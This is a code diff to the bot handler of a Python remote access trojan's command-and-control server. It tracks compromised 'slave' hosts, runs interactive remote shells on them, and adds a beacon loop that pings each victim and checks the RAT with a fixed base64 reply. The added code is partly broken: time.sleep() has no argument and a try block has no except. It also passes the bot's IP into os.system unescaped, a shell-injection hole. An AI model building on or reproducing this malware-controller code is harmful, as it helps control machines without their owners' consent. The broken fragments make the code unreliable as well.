@@ -18,7 +18,9 @@ class Handler(threading.Thread):
         self.port = client_address[1]
         self.bot_id = bot_id
         self.info = [self.bot_id,self.ip,self.port]
-        self.status = "ALIVE"
+        self.status = ["OK","OK"]                             # <-- 0 = Beacon Failed, Connection to RAT broken standby
+                                                        #     1 = Beacon Success, Connection is alive and well
+                                                        #     2 = Last Beacon Failed. Connection seems down. The next check will set status
 
         # self.respQueue = queue.Queue()
         # self.cmdQueue = queue.Queue()
@@ -43,6 +45,9 @@ class Handler(threading.Thread):
         #self.BotName = threading.current_thread().getName()
 
         print(f"[*BotHandler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
+
+        # Beacon indefinitely??
+        self.beacon()
 
         # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
         #server.agentList[self.bot_id]
@@ -73,11 +78,28 @@ class Handler(threading.Thread):
         #     threading.current_thread().join
 
 
-    def getStatus(self):
-        return self.status
+    def beacon(self):
+        
+        while(True):
+
+            time.sleep()
+
+            # Check HOST-STATUS
+            icmp = os.system("ping -c 1 " + self.ip)
+            if icmp == 0:
+                self.status[0] = "UP"
+            else:
+                self.status[0] = "DOWN"
+
+            # Check RAT-STATUS
+            try:
+                if self.execute("beacon") == "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy":
+                    self.status[1] = "UP"
+                else:
+                    self.status[1] = "DOWN"
     
-    def setStatus(self, stat):
-        self.status = stat
+    def setStatus(self, status):
+        self.status = status
 
     def getInfo(self):
         return self.info
@@ -169,7 +191,7 @@ class Handler(threading.Thread):
                             else:
                                 cmd_response += recv  
                         
-                        print("yo1")
+                        # print("yo1")
                         shell_exit = True
 
                     else:
@@ -210,7 +232,7 @@ class Handler(threading.Thread):
                         print(cmd_response.replace(cmd_sent,""))
             
                     if(shell_exit):
-                        print("yo")
+                        # print("yo")
                         break
 
         print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
@@ -237,21 +259,31 @@ class Handler(threading.Thread):
             print(f"[* BotHandler-Msg] Error: {ex}")
             return "== Return Value Error =="
         else:
-            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
-            return recvVal
+            cmd_response = ""
+            while(True):
+                try:
+                    self.client.settimeout(3)
+                    recv = self.client.recv(4096).decode('utf-8')
+
+                except socket.timeout:
+                    # if timeout exception is triggered - assume no data anymore
+                    recv = ""
+                except Exception as ex:
+                    print("[* BotHandler-Msg:Exec] Unable to process received data.")
+                    print(f"[* BotHandler-Msg:Exec] Error: {ex}")
+                    break
+
+                if not recv:
+                    break
+                else:
+                    cmd_response += recv
+            
+            return cmd_response
 
             # TODO %%
             # print(f"[* BotHandler-Msg] Using beacon verification to test if host is still up...")
             # if(!beacon(bot_id)):
             #   <Kill connection, join the thread, ad to list of dead bots>
-
-    def beacon(self):
-        # Ping host 
-        #   if no reply, Kill host connection
-        #
-        print("ping")
-        # beacon rat
-        #   if no reply, set host status to LOST
 
     # TODO %%
     def download(self, remotepath, localfile):
